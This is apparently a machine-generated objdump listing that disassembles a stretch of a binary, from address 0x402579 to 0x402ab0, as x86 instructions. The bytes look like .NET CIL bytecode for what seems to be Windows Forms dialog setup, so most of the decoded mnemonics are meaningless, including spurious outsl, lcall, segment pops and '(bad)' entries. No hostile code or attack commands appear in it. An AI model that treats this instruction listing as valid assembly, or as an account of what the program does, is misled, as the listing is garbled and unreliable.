  402579:	16                   	push   %ss
  40257a:	6f                   	outsl  %ds:(%esi),(%dx)
  40257b:	4b                   	dec    %ebx
  40257c:	00 00                	add    %al,(%eax)
  40257e:	0a 06                	or     (%esi),%al
  402580:	09 6f 4c             	or     %ebp,0x4c(%edi)
  402583:	00 00                	add    %al,(%eax)
  402585:	0a 06                	or     (%esi),%al
  402587:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  40258a:	4d                   	dec    %ebp
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 06                	or     (%esi),%al
  40258f:	6f                   	outsl  %ds:(%esi),(%dx)
  402590:	4e                   	dec    %esi
  402591:	00 00                	add    %al,(%eax)
  402593:	0a 13                	or     (%ebx),%dl
  402595:	07                   	pop    %es
  402596:	04 08                	add    $0x8,%al
  402598:	6f                   	outsl  %ds:(%esi),(%dx)
  402599:	4f                   	dec    %edi
  40259a:	00 00                	add    %al,(%eax)
  40259c:	0a 51 11             	or     0x11(%ecx),%dl
  40259f:	07                   	pop    %es
  4025a0:	2a 00                	sub    (%eax),%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	01 10                	add    %edx,(%eax)
  4025a6:	00 00                	add    %al,(%eax)
  4025a8:	00 00                	add    %al,(%eax)
  4025aa:	07                   	pop    %es
  4025ab:	02 17                	add    (%edi),%dl
  4025ad:	1e                   	push   %ds
  4025ae:	02 03                	add    (%ebx),%al
  4025b0:	01 00                	add    %eax,(%eax)
  4025b2:	00 01                	add    %al,(%ecx)
  4025b4:	2a 02                	sub    (%edx),%al
  4025b6:	03 04 16             	add    (%esi,%edx,1),%eax
  4025b9:	28 20                	sub    %ah,(%eax)
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	2a 1e                	sub    (%esi),%bl
  4025c0:	02 28                	add    (%eax),%ch
  4025c2:	11 00                	adc    %eax,(%eax)
  4025c4:	00 0a                	add    %cl,(%edx)
  4025c6:	2a 00                	sub    (%eax),%al
  4025c8:	1b 30                	sbb    (%eax),%esi
  4025ca:	05 00 ed 02 00       	add    $0x2ed00,%eax
  4025cf:	00 06                	add    %al,(%esi)
  4025d1:	00 00                	add    %al,(%eax)
  4025d3:	11 02                	adc    %eax,(%edx)
  4025d5:	2d 02 15 2a 02       	sub    $0x22a1502,%eax
  4025da:	6f                   	outsl  %ds:(%esi),(%dx)
  4025db:	50                   	push   %eax
  4025dc:	00 00                	add    %al,(%eax)
  4025de:	0a 17                	or     (%edi),%dl
  4025e0:	2f                   	das
  4025e1:	02 15 2a 73 18 00    	add    0x18732a,%dl
  4025e7:	00 0a                	add    %cl,(%edx)
  4025e9:	0a 06                	or     (%esi),%al
  4025eb:	22 00                	and    (%eax),%al
  4025ed:	00 c0                	add    %al,%al
  4025ef:	40                   	inc    %eax
  4025f0:	22 00                	and    (%eax),%al
  4025f2:	00 50 41             	add    %dl,0x41(%eax)
  4025f5:	73 2a                	jae    0x402621
  4025f7:	00 00                	add    %al,(%eax)
  4025f9:	0a 6f 2b             	or     0x2b(%edi),%ch
  4025fc:	00 00                	add    %al,(%eax)
  4025fe:	0a 06                	or     (%esi),%al
  402600:	17                   	pop    %ss
  402601:	6f                   	outsl  %ds:(%esi),(%dx)
  402602:	2c 00                	sub    $0x0,%al
  402604:	00 0a                	add    %cl,(%edx)
  402606:	02 6f 50             	add    0x50(%edi),%ch
  402609:	00 00                	add    %al,(%eax)
  40260b:	0a 8d 4c 00 00 01    	or     0x100004c(%ebp),%cl
  402611:	0b 73 51             	or     0x51(%ebx),%esi
  402614:	00 00                	add    %al,(%eax)
  402616:	0a 0c 73             	or     (%ebx,%esi,2),%cl
  402619:	2f                   	das
  40261a:	00 00                	add    %al,(%eax)
  40261c:	0a 0d 1f 13 13 04    	or     0x413131f,%cl
  402622:	16                   	push   %ss
  402623:	13 05 05 28 0d 00    	adc    0xd2805,%eax
  402629:	00 0a                	add    %cl,(%edx)
  40262b:	2d 6e 73 2d 00       	sub    $0x2d736e,%eax
  402630:	00 0a                	add    %cl,(%edx)
  402632:	13 06                	adc    (%esi),%eax
  402634:	11 06                	adc    %eax,(%esi)
  402636:	05 6f 30 00 00       	add    $0x306f,%eax
  40263b:	0a 11                	or     (%ecx),%dl
  40263d:	06                   	push   %es
  40263e:	1f                   	pop    %ds
  40263f:	09 1f                	or     %ebx,(%edi)
  402641:	13 73 31             	adc    0x31(%ebx),%esi
  402644:	00 00                	add    %al,(%eax)
  402646:	0a 6f 32             	or     0x32(%edi),%ch
  402649:	00 00                	add    %al,(%eax)
  40264b:	0a 11                	or     (%ecx),%dl
  40264d:	06                   	push   %es
  40264e:	06                   	push   %es
  40264f:	28 33                	sub    %dh,(%ebx)
  402651:	00 00                	add    %al,(%eax)
  402653:	0a 6f 34             	or     0x34(%edi),%ch
  402656:	00 00                	add    %al,(%eax)
  402658:	0a 13                	or     (%ebx),%dl
  40265a:	0c 12                	or     $0x12,%al
  40265c:	0c 28                	or     $0x28,%al
  40265e:	35 00 00 0a 1b       	xor    $0x1b0a0000,%eax
  402663:	5a                   	pop    %edx
  402664:	1e                   	push   %ds
  402665:	5b                   	pop    %ebx
  402666:	1f                   	pop    %ds
  402667:	12 59 16             	adc    0x16(%ecx),%bl
  40266a:	73 36                	jae    0x4026a2
  40266c:	00 00                	add    %al,(%eax)
  40266e:	0a 6f 37             	or     0x37(%edi),%ch
  402671:	00 00                	add    %al,(%eax)
  402673:	0a 11                	or     (%ecx),%dl
  402675:	06                   	push   %es
  402676:	17                   	pop    %ss
  402677:	6f                   	outsl  %ds:(%esi),(%dx)
  402678:	38 00                	cmp    %al,(%eax)
  40267a:	00 0a                	add    %cl,(%edx)
  40267c:	06                   	push   %es
  40267d:	6f                   	outsl  %ds:(%esi),(%dx)
  40267e:	39 00                	cmp    %eax,(%eax)
  402680:	00 0a                	add    %cl,(%edx)
  402682:	11 06                	adc    %eax,(%esi)
  402684:	6f                   	outsl  %ds:(%esi),(%dx)
  402685:	3a 00                	cmp    (%eax),%al
  402687:	00 0a                	add    %cl,(%edx)
  402689:	11 06                	adc    %eax,(%esi)
  40268b:	6f                   	outsl  %ds:(%esi),(%dx)
  40268c:	3c 00                	cmp    $0x0,%al
  40268e:	00 0a                	add    %cl,(%edx)
  402690:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402693:	06                   	push   %es
  402694:	6f                   	outsl  %ds:(%esi),(%dx)
  402695:	3d 00 00 0a 13       	cmp    $0x130a0000,%eax
  40269a:	05 16 13 07 06       	add    $0x6071316,%eax
  40269f:	28 33                	sub    %dh,(%ebx)
  4026a1:	00 00                	add    %al,(%eax)
  4026a3:	0a 6f 34             	or     0x34(%edi),%ch
  4026a6:	00 00                	add    %al,(%eax)
  4026a8:	0a 13                	or     (%ebx),%dl
  4026aa:	0d 12 0d 28 35       	or     $0x35280d12,%eax
  4026af:	00 00                	add    %al,(%eax)
  4026b1:	0a 1b                	or     (%ebx),%bl
  4026b3:	5a                   	pop    %edx
  4026b4:	1e                   	push   %ds
  4026b5:	5b                   	pop    %ebx
  4026b6:	1f                   	pop    %ds
  4026b7:	12 59 13             	adc    0x13(%ecx),%bl
  4026ba:	08 02                	or     %al,(%edx)
  4026bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4026bd:	52                   	push   %edx
  4026be:	00 00                	add    %al,(%eax)
  4026c0:	0a 13                	or     (%ebx),%dl
  4026c2:	0e                   	push   %cs
  4026c3:	38 ed                	cmp    %ch,%ch
  4026c5:	00 00                	add    %al,(%eax)
  4026c7:	00 11                	add    %dl,(%ecx)
  4026c9:	0e                   	push   %cs
  4026ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4026cb:	53                   	push   %ebx
  4026cc:	00 00                	add    %al,(%eax)
  4026ce:	0a 13                	or     (%ebx),%dl
  4026d0:	09 07                	or     %eax,(%edi)
  4026d2:	11 07                	adc    %eax,(%edi)
  4026d4:	73 54                	jae    0x40272a
  4026d6:	00 00                	add    %al,(%eax)
  4026d8:	0a a2 07 11 07 9a    	or     -0x65f8eef9(%edx),%ah
  4026de:	11 09                	adc    %ecx,(%ecx)
  4026e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4026e1:	55                   	push   %ebp
  4026e2:	00 00                	add    %al,(%eax)
  4026e4:	0a 6f 30             	or     0x30(%edi),%ch
  4026e7:	00 00                	add    %al,(%eax)
  4026e9:	0a 11                	or     (%ecx),%dl
  4026eb:	07                   	pop    %es
  4026ec:	03 33                	add    (%ebx),%esi
  4026ee:	0a 07                	or     (%edi),%al
  4026f0:	11 07                	adc    %eax,(%edi)
  4026f2:	9a 17 6f 56 00 00 0a 	lcall  $0xa00,$0x566f17
  4026f9:	07                   	pop    %es
  4026fa:	11 07                	adc    %eax,(%edi)
  4026fc:	9a 1f 09 11 04 73 31 	lcall  $0x3173,$0x411091f
  402703:	00 00                	add    %al,(%eax)
  402705:	0a 6f 32             	or     0x32(%edi),%ch
  402708:	00 00                	add    %al,(%eax)
  40270a:	0a 07                	or     (%edi),%al
  40270c:	11 07                	adc    %eax,(%edi)
  40270e:	9a 17 6f 38 00 00 0a 	lcall  $0xa00,$0x386f17
  402715:	06                   	push   %es
  402716:	6f                   	outsl  %ds:(%esi),(%dx)
  402717:	39 00                	cmp    %eax,(%eax)
  402719:	00 0a                	add    %cl,(%edx)
  40271b:	07                   	pop    %es
  40271c:	11 07                	adc    %eax,(%edi)
  40271e:	9a 6f 3a 00 00 0a 07 	lcall  $0x70a,$0x3a6f
  402725:	11 07                	adc    %eax,(%edi)
  402727:	9a 6f 57 00 00 0a 11 	lcall  $0x110a,$0x576f
  40272e:	08 31                	or     %dh,(%ecx)
  402730:	3c 07                	cmp    $0x7,%al
  402732:	11 07                	adc    %eax,(%edi)
  402734:	9a 6f 58 00 00 0a 13 	lcall  $0x130a,$0x586f
  40273b:	0a 07                	or     (%edi),%al
  40273d:	11 07                	adc    %eax,(%edi)
  40273f:	9a 11 0a 17 07 11 07 	lcall  $0x711,$0x7170a11
  402746:	9a 6f 57 00 00 0a 17 	lcall  $0x170a,$0x576f
  40274d:	59                   	pop    %ecx
  40274e:	11 08                	adc    %ecx,(%eax)
  402750:	5b                   	pop    %ebx
  402751:	58                   	pop    %eax
  402752:	5a                   	pop    %edx
  402753:	6f                   	outsl  %ds:(%esi),(%dx)
  402754:	59                   	pop    %ecx
  402755:	00 00                	add    %al,(%eax)
  402757:	0a 07                	or     (%edi),%al
  402759:	11 07                	adc    %eax,(%edi)
  40275b:	9a 11 08 6f 5a 00 00 	lcall  $0x0,$0x5a6f0811
  402762:	0a 07                	or     (%edi),%al
  402764:	11 07                	adc    %eax,(%edi)
  402766:	9a 16 6f 38 00 00 0a 	lcall  $0xa00,$0x386f16
  40276d:	07                   	pop    %es
  40276e:	11 07                	adc    %eax,(%edi)
  402770:	9a 6f 3c 00 00 0a 13 	lcall  $0x130a,$0x3c6f
  402777:	04 07                	add    $0x7,%al
  402779:	11 07                	adc    %eax,(%edi)
  40277b:	9a 6f 3d 00 00 0a 11 	lcall  $0x110a,$0x3d6f
  402782:	05 31 0b 07 11       	add    $0x11070b31,%eax
  402787:	07                   	pop    %es
  402788:	9a 6f 3d 00 00 0a 13 	lcall  $0x130a,$0x3d6f
  40278f:	05 11 09 6f 5b       	add    $0x5b6f0911,%eax
  402794:	00 00                	add    %al,(%eax)
  402796:	0a 28                	or     (%eax),%ch
  402798:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  40279d:	11 08                	adc    %ecx,(%eax)
  40279f:	07                   	pop    %es
  4027a0:	11 07                	adc    %eax,(%edi)
  4027a2:	9a 11 09 6f 5b 00 00 	lcall  $0x0,$0x5b6f0911
  4027a9:	0a 6f 5c             	or     0x5c(%edi),%ch
  4027ac:	00 00                	add    %al,(%eax)
  4027ae:	0a 11                	or     (%ecx),%dl
  4027b0:	07                   	pop    %es
  4027b1:	17                   	pop    %ss
  4027b2:	58                   	pop    %eax
  4027b3:	13 07                	adc    (%edi),%eax
  4027b5:	11 0e                	adc    %ecx,(%esi)
  4027b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4027b8:	5d                   	pop    %ebp
  4027b9:	00 00                	add    %al,(%eax)
  4027bb:	0a 3a                	or     (%edx),%bh
  4027bd:	07                   	pop    %es
  4027be:	ff                   	(bad)
  4027bf:	ff                   	(bad)
  4027c0:	ff                   	lcall  (bad)
  4027c1:	de 0c 11             	fimuls (%ecx,%edx,1)
  4027c4:	0e                   	push   %cs
  4027c5:	2c 07                	sub    $0x7,%al
  4027c7:	11 0e                	adc    %ecx,(%esi)
  4027c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4027ca:	5e                   	pop    %esi
  4027cb:	00 00                	add    %al,(%eax)
  4027cd:	0a dc                	or     %ah,%bl
  4027cf:	08 17                	or     %dl,(%edi)
  4027d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4027d2:	5f                   	pop    %edi
  4027d3:	00 00                	add    %al,(%eax)
  4027d5:	0a 09                	or     (%ecx),%cl
  4027d7:	72 47                	jb     0x402820
  4027d9:	00 00                	add    %al,(%eax)
  4027db:	70 6f                	jo     0x40284c
  4027dd:	30 00                	xor    %al,(%eax)
  4027df:	00 0a                	add    %cl,(%edx)
  4027e1:	09 17                	or     %edx,(%edi)
  4027e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4027e4:	40                   	inc    %eax
  4027e5:	00 00                	add    %al,(%eax)
  4027e7:	0a 09                	or     (%ecx),%cl
  4027e9:	1f                   	pop    %ds
  4027ea:	0c 11                	or     $0x11,%al
  4027ec:	05 1f 4d 59 28       	add    $0x28594d1f,%eax
  4027f1:	41                   	inc    %ecx
  4027f2:	00 00                	add    %al,(%eax)
  4027f4:	0a 11                	or     (%ecx),%dl
  4027f6:	04 1f                	add    $0x1f,%al
  4027f8:	24 58                	and    $0x58,%al
  4027fa:	1f                   	pop    %ds
  4027fb:	4b                   	dec    %ebx
  4027fc:	1f                   	pop    %ds
  4027fd:	17                   	pop    %ss
  4027fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4027ff:	3e 00 00             	add    %al,%ds:(%eax)
  402802:	0a 04 28             	or     (%eax,%ebp,1),%al
  402805:	0d 00 00 0a 2c       	or     $0x2c0a0000,%eax
  40280a:	12 06                	adc    (%esi),%al
  40280c:	28 27                	sub    %ah,(%edi)
  40280e:	00 00                	add    %al,(%eax)
  402810:	0a 6f 28             	or     0x28(%edi),%ch
  402813:	00 00                	add    %al,(%eax)
  402815:	0a 6f 30             	or     0x30(%edi),%ch
  402818:	00 00                	add    %al,(%eax)
  40281a:	0a 2b                	or     (%ebx),%ch
  40281c:	07                   	pop    %es
  40281d:	06                   	push   %es
  40281e:	04 6f                	add    $0x6f,%al
  402820:	30 00                	xor    %al,(%eax)
  402822:	00 0a                	add    %cl,(%edx)
  402824:	06                   	push   %es
  402825:	20 b2 00 00 00 11    	and    %dh,0x11000000(%edx)
  40282b:	05 1f 0a 58 28       	add    $0x28580a1f,%eax
  402830:	41                   	inc    %ecx
  402831:	00 00                	add    %al,(%eax)
  402833:	0a 11                	or     (%ecx),%dl
  402835:	04 1f                	add    $0x1f,%al
  402837:	47                   	inc    %edi
  402838:	58                   	pop    %eax
  402839:	73 36                	jae    0x402871
  40283b:	00 00                	add    %al,(%eax)
  40283d:	0a 6f 42             	or     0x42(%edi),%ch
  402840:	00 00                	add    %al,(%eax)
  402842:	0a 06                	or     (%esi),%al
  402844:	6f                   	outsl  %ds:(%esi),(%dx)
  402845:	39 00                	cmp    %eax,(%eax)
  402847:	00 0a                	add    %cl,(%edx)
  402849:	09 6f 3a             	or     %ebp,0x3a(%edi)
  40284c:	00 00                	add    %al,(%eax)
  40284e:	0a 06                	or     (%esi),%al
  402850:	19 6f 44             	sbb    %ebp,0x44(%edi)
  402853:	00 00                	add    %al,(%eax)
  402855:	0a 06                	or     (%esi),%al
  402857:	17                   	pop    %ss
  402858:	6f                   	outsl  %ds:(%esi),(%dx)
  402859:	45                   	inc    %ebp
  40285a:	00 00                	add    %al,(%eax)
  40285c:	0a 06                	or     (%esi),%al
  40285e:	28 46 00             	sub    %al,0x0(%esi)
  402861:	00 0a                	add    %cl,(%edx)
  402863:	6f                   	outsl  %ds:(%esi),(%dx)
  402864:	47                   	inc    %edi
  402865:	00 00                	add    %al,(%eax)
  402867:	0a 28                	or     (%eax),%ch
  402869:	48                   	dec    %eax
  40286a:	00 00                	add    %al,(%eax)
  40286c:	0a 6f 49             	or     0x49(%edi),%ch
  40286f:	00 00                	add    %al,(%eax)
  402871:	0a de                	or     %dh,%bl
  402873:	03 26                	add    (%esi),%esp
  402875:	de 00                	fiadds (%eax)
  402877:	06                   	push   %es
  402878:	16                   	push   %ss
  402879:	6f                   	outsl  %ds:(%esi),(%dx)
  40287a:	4a                   	dec    %edx
  40287b:	00 00                	add    %al,(%eax)
  40287d:	0a 06                	or     (%esi),%al
  40287f:	16                   	push   %ss
  402880:	6f                   	outsl  %ds:(%esi),(%dx)
  402881:	4b                   	dec    %ebx
  402882:	00 00                	add    %al,(%eax)
  402884:	0a 06                	or     (%esi),%al
  402886:	09 6f 4c             	or     %ebp,0x4c(%edi)
  402889:	00 00                	add    %al,(%eax)
  40288b:	0a 06                	or     (%esi),%al
  40288d:	6f                   	outsl  %ds:(%esi),(%dx)
  40288e:	4e                   	dec    %esi
  40288f:	00 00                	add    %al,(%eax)
  402891:	0a 17                	or     (%edi),%dl
  402893:	33 2a                	xor    (%edx),%ebp
  402895:	15 13 0b 16 13       	adc    $0x13160b13,%eax
  40289a:	07                   	pop    %es
  40289b:	2b 15 07 11 07 9a    	sub    0x9a071107,%edx
  4028a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4028a2:	60                   	pusha
  4028a3:	00 00                	add    %al,(%eax)
  4028a5:	0a 2c 04             	or     (%esp,%eax,1),%ch
  4028a8:	11 07                	adc    %eax,(%edi)
  4028aa:	13 0b                	adc    (%ebx),%ecx
  4028ac:	11 07                	adc    %eax,(%edi)
  4028ae:	17                   	pop    %ss
  4028af:	58                   	pop    %eax
  4028b0:	13 07                	adc    (%edi),%eax
  4028b2:	11 07                	adc    %eax,(%edi)
  4028b4:	02 6f 50             	add    0x50(%edi),%ch
  4028b7:	00 00                	add    %al,(%eax)
  4028b9:	0a 32                	or     (%edx),%dh
  4028bb:	e1 11                	loope  0x4028ce
  4028bd:	0b 2a                	or     (%edx),%ebp
  4028bf:	15 2a 00 00 00       	adc    $0x2a,%eax
  4028c4:	41                   	inc    %ecx
  4028c5:	34 00                	xor    $0x0,%al
  4028c7:	00 02                	add    %al,(%edx)
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 ef                	add    %ch,%bh
  4028cd:	00 00                	add    %al,(%eax)
  4028cf:	00 00                	add    %al,(%eax)
  4028d1:	01 00                	add    %eax,(%eax)
  4028d3:	00 ef                	add    %ch,%bh
  4028d5:	01 00                	add    %eax,(%eax)
  4028d7:	00 0c 00             	add    %cl,(%eax,%eax,1)
	...
  4028e2:	00 00                	add    %al,(%eax)
  4028e4:	89 02                	mov    %eax,(%edx)
  4028e6:	00 00                	add    %al,(%eax)
  4028e8:	17                   	pop    %ss
  4028e9:	00 00                	add    %al,(%eax)
  4028eb:	00 a0 02 00 00 03    	add    %ah,0x3000002(%eax)
  4028f1:	00 00                	add    %al,(%eax)
  4028f3:	00 01                	add    %al,(%ecx)
  4028f5:	00 00                	add    %al,(%eax)
  4028f7:	01 1e                	add    %ebx,(%esi)
  4028f9:	02 28                	add    (%eax),%ch
  4028fb:	11 00                	adc    %eax,(%eax)
  4028fd:	00 0a                	add    %cl,(%edx)
  4028ff:	2a 13                	sub    (%ebx),%dl
  402901:	30 06                	xor    %al,(%esi)
  402903:	00 50 00             	add    %dl,0x0(%eax)
  402906:	00 00                	add    %al,(%eax)
  402908:	07                   	pop    %es
  402909:	00 00                	add    %al,(%eax)
  40290b:	11 1f                	adc    %ebx,(%edi)
  40290d:	40                   	inc    %eax
  40290e:	73 61                	jae    0x402971
  402910:	00 00                	add    %al,(%eax)
  402912:	0a 0a                	or     (%edx),%cl
  402914:	20 00                	and    %al,(%eax)
  402916:	01 00                	add    %eax,(%eax)
  402918:	00 8d 51 00 00 01    	add    %cl,0x1000051(%ebp)
  40291e:	0b 03                	or     (%ebx),%eax
  402920:	2c 09                	sub    $0x9,%al
  402922:	07                   	pop    %es
  402923:	1f                   	pop    %ds
  402924:	10 20                	adc    %ah,(%eax)
  402926:	ff 00                	incl   (%eax)
  402928:	00 00                	add    %al,(%eax)
  40292a:	9c                   	pushf
  40292b:	04 2c                	add    $0x2c,%al
  40292d:	12 07                	adc    (%edi),%al
  40292f:	1f                   	pop    %ds
  402930:	11 20                	adc    %esp,(%eax)
  402932:	ff 00                	incl   (%eax)
  402934:	00 00                	add    %al,(%eax)
  402936:	9c                   	pushf
  402937:	07                   	pop    %es
  402938:	1f                   	pop    %ds
  402939:	12 20                	adc    (%eax),%ah
  40293b:	ff 00                	incl   (%eax)
  40293d:	00 00                	add    %al,(%eax)
  40293f:	9c                   	pushf
  402940:	02 16                	add    (%esi),%dl
  402942:	07                   	pop    %es
  402943:	06                   	push   %es
  402944:	1f                   	pop    %ds
  402945:	40                   	inc    %eax
  402946:	16                   	push   %ss
  402947:	28 25 00 00 06 17    	sub    %ah,0x17060000
  40294d:	32 07                	xor    (%edi),%al
  40294f:	06                   	push   %es
  402950:	6f                   	outsl  %ds:(%esi),(%dx)
  402951:	10 00                	adc    %al,(%eax)
  402953:	00 0a                	add    %cl,(%edx)
  402955:	2a 72 5b             	sub    0x5b(%edx),%dh
  402958:	00 00                	add    %al,(%eax)
  40295a:	70 2a                	jo     0x402986
  40295c:	1b 30                	sbb    (%eax),%esi
  40295e:	04 00                	add    $0x0,%al
  402960:	03 01                	add    (%ecx),%eax
  402962:	00 00                	add    %al,(%eax)
  402964:	08 00                	or     %al,(%eax)
  402966:	00 11                	add    %dl,(%ecx)
  402968:	73 29                	jae    0x402993
  40296a:	00 00                	add    %al,(%eax)
  40296c:	06                   	push   %es
  40296d:	0a 73 2d             	or     0x2d(%ebx),%dh
  402970:	00 00                	add    %al,(%eax)
  402972:	0a 0b                	or     (%ebx),%cl
  402974:	03 28                	add    (%eax),%ebp
  402976:	0d 00 00 0a 2c       	or     $0x2c0a0000,%eax
  40297b:	0d 07 72 5f 00       	or     $0x5f7207,%eax
  402980:	00 70 6f             	add    %dh,0x6f(%eax)
  402983:	30 00                	xor    %al,(%eax)
  402985:	00 0a                	add    %cl,(%edx)
  402987:	2b 07                	sub    (%edi),%eax
  402989:	07                   	pop    %es
  40298a:	03 6f 30             	add    0x30(%edi),%ebp
  40298d:	00 00                	add    %al,(%eax)
  40298f:	0a 07                	or     (%edi),%al
  402991:	1f                   	pop    %ds
  402992:	09 1f                	or     %ebx,(%edi)
  402994:	13 73 31             	adc    0x31(%ebx),%esi
  402997:	00 00                	add    %al,(%eax)
  402999:	0a 6f 32             	or     0x32(%edi),%ch
  40299c:	00 00                	add    %al,(%eax)
  40299e:	0a 07                	or     (%edi),%al
  4029a0:	06                   	push   %es
  4029a1:	28 33                	sub    %dh,(%ebx)
  4029a3:	00 00                	add    %al,(%eax)
  4029a5:	0a 6f 34             	or     0x34(%edi),%ch
  4029a8:	00 00                	add    %al,(%eax)
  4029aa:	0a 0c 12             	or     (%edx,%edx,1),%cl
  4029ad:	02 28                	add    (%eax),%ch
  4029af:	35 00 00 0a 1b       	xor    $0x1b0a0000,%eax
  4029b4:	5a                   	pop    %edx
  4029b5:	1e                   	push   %ds
  4029b6:	5b                   	pop    %ebx
  4029b7:	1f                   	pop    %ds
  4029b8:	12 59 16             	adc    0x16(%ecx),%bl
  4029bb:	73 36                	jae    0x4029f3
  4029bd:	00 00                	add    %al,(%eax)
  4029bf:	0a 6f 37             	or     0x37(%edi),%ch
  4029c2:	00 00                	add    %al,(%eax)
  4029c4:	0a 07                	or     (%edi),%al
  4029c6:	17                   	pop    %ss
  4029c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c8:	38 00                	cmp    %al,(%eax)
  4029ca:	00 0a                	add    %cl,(%edx)
  4029cc:	06                   	push   %es
  4029cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4029ce:	39 00                	cmp    %eax,(%eax)
  4029d0:	00 0a                	add    %cl,(%edx)
  4029d2:	07                   	pop    %es
  4029d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4029d4:	3a 00                	cmp    (%eax),%al
  4029d6:	00 0a                	add    %cl,(%edx)
  4029d8:	02 28                	add    (%eax),%ch
  4029da:	0d 00 00 0a 2c       	or     $0x2c0a0000,%eax
  4029df:	12 06                	adc    (%esi),%al
  4029e1:	28 27                	sub    %ah,(%edi)
  4029e3:	00 00                	add    %al,(%eax)
  4029e5:	0a 6f 28             	or     0x28(%edi),%ch
  4029e8:	00 00                	add    %al,(%eax)
  4029ea:	0a 6f 30             	or     0x30(%edi),%ch
  4029ed:	00 00                	add    %al,(%eax)
  4029ef:	0a 2b                	or     (%ebx),%ch
  4029f1:	07                   	pop    %es
  4029f2:	06                   	push   %es
  4029f3:	02 6f 30             	add    0x30(%edi),%ch
  4029f6:	00 00                	add    %al,(%eax)
  4029f8:	0a 06                	or     (%esi),%al
  4029fa:	20 b2 00 00 00 07    	and    %dh,0x7000000(%edx)
  402a00:	6f                   	outsl  %ds:(%esi),(%dx)
  402a01:	3d 00 00 0a 1f       	cmp    $0x1f0a0000,%eax
  402a06:	0a 58 28             	or     0x28(%eax),%bl
  402a09:	41                   	inc    %ecx
  402a0a:	00 00                	add    %al,(%eax)
  402a0c:	0a 07                	or     (%edi),%al
  402a0e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a0f:	3c 00                	cmp    $0x0,%al
  402a11:	00 0a                	add    %cl,(%edx)
  402a13:	1f                   	pop    %ds
  402a14:	37                   	aaa
  402a15:	58                   	pop    %eax
  402a16:	73 36                	jae    0x402a4e
  402a18:	00 00                	add    %al,(%eax)
  402a1a:	0a 6f 42             	or     0x42(%edi),%ch
  402a1d:	00 00                	add    %al,(%eax)
  402a1f:	0a 06                	or     (%esi),%al
  402a21:	19 6f 44             	sbb    %ebp,0x44(%edi)
  402a24:	00 00                	add    %al,(%eax)
  402a26:	0a 06                	or     (%esi),%al
  402a28:	17                   	pop    %ss
  402a29:	6f                   	outsl  %ds:(%esi),(%dx)
  402a2a:	45                   	inc    %ebp
  402a2b:	00 00                	add    %al,(%eax)
  402a2d:	0a 06                	or     (%esi),%al
  402a2f:	28 46 00             	sub    %al,0x0(%esi)
  402a32:	00 0a                	add    %cl,(%edx)
  402a34:	6f                   	outsl  %ds:(%esi),(%dx)
  402a35:	47                   	inc    %edi
  402a36:	00 00                	add    %al,(%eax)
  402a38:	0a 28                	or     (%eax),%ch
  402a3a:	48                   	dec    %eax
  402a3b:	00 00                	add    %al,(%eax)
  402a3d:	0a 6f 49             	or     0x49(%edi),%ch
  402a40:	00 00                	add    %al,(%eax)
  402a42:	0a de                	or     %dh,%bl
  402a44:	03 26                	add    (%esi),%esp
  402a46:	de 00                	fiadds (%eax)
  402a48:	06                   	push   %es
  402a49:	16                   	push   %ss
  402a4a:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4b:	4a                   	dec    %edx
  402a4c:	00 00                	add    %al,(%eax)
  402a4e:	0a 06                	or     (%esi),%al
  402a50:	16                   	push   %ss
  402a51:	6f                   	outsl  %ds:(%esi),(%dx)
  402a52:	4b                   	dec    %ebx
  402a53:	00 00                	add    %al,(%eax)
  402a55:	0a 06                	or     (%esi),%al
  402a57:	04 7d                	add    $0x7d,%al
  402a59:	27                   	daa
  402a5a:	00 00                	add    %al,(%eax)
  402a5c:	04 06                	add    $0x6,%al
  402a5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a5f:	4e                   	dec    %esi
  402a60:	00 00                	add    %al,(%eax)
  402a62:	0a 26                	or     (%esi),%ah
  402a64:	06                   	push   %es
  402a65:	7b 28                	jnp    0x402a8f
  402a67:	00 00                	add    %al,(%eax)
  402a69:	04 2a                	add    $0x2a,%al
  402a6b:	00 01                	add    %al,(%ecx)
  402a6d:	10 00                	adc    %al,(%eax)
  402a6f:	00 00                	add    %al,(%eax)
  402a71:	00 c6                	add    %al,%dh
  402a73:	00 17                	add    %dl,(%edi)
  402a75:	dd 00                	fldl   (%eax)
  402a77:	03 01                	add    (%ecx),%eax
  402a79:	00 00                	add    %al,(%eax)
  402a7b:	01 1e                	add    %ebx,(%esi)
  402a7d:	02 28                	add    (%eax),%ch
  402a7f:	11 00                	adc    %eax,(%eax)
  402a81:	00 0a                	add    %cl,(%edx)
  402a83:	2a 03                	sub    (%ebx),%al
  402a85:	30 03                	xor    %al,(%ebx)
  402a87:	00 4e 00             	add    %cl,0x0(%esi)
  402a8a:	00 00                	add    %al,(%eax)
  402a8c:	00 00                	add    %al,(%eax)
  402a8e:	00 00                	add    %al,(%eax)
  402a90:	02 17                	add    (%edi),%dl
  402a92:	7d 27                	jge    0x402abb
  402a94:	00 00                	add    %al,(%eax)
  402a96:	04 02                	add    $0x2,%al
  402a98:	28 18                	sub    %bl,(%eax)
  402a9a:	00 00                	add    %al,(%eax)
  402a9c:	0a 02                	or     (%edx),%al
  402a9e:	22 00                	and    (%eax),%al
  402aa0:	00 c0                	add    %al,%al
  402aa2:	40                   	inc    %eax
  402aa3:	22 00                	and    (%eax),%al
  402aa5:	00 50 41             	add    %dl,0x41(%eax)
  402aa8:	73 2a                	jae    0x402ad4
  402aaa:	00 00                	add    %al,(%eax)
  402aac:	0a 28                	or     (%eax),%ch
  402aae:	2b 00                	sub    (%eax),%eax
  402ab0:	00 0a                	add    %cl,(%edx)
